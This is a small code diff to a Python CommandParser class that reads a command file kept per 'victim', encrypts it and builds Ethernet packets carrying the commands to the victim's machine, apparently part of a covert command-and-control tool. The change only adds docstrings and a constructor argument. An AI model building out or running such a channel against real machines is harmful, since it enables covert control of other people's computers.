@@ -14,15 +14,21 @@ class CommandParser():
     def parse(self, victim_mac, victim_pkt, rel_path, command_file):
         """Parses the input file in the input directory of victim and builds packet for command
         
+        Arguments:
+            victim_mac {Mac} -- object representing Mac address of user
+            victim_pkt {Ether} -- packet sent from client
+            rel_path {string} -- the relative path to the data folder
+            command_file {string} -- name of the command file to look for
+        
         Returns:
-            Ether[] -- list of packets that contain command data
+            Ether[] -- list of constructed packets to be sent to the client
         """
 
         # Read corresponding folder for input file
         pkts = []
         path = rel_path + '/input/' + command_file
         if os.path.isfile(path):
-            bundler = Bundler(victim_pkt)
+            bundler = Bundler(victim_mac, victim_pkt)
 
             # Open file contents, encrypt, and build response packet
             with open(path) as f:
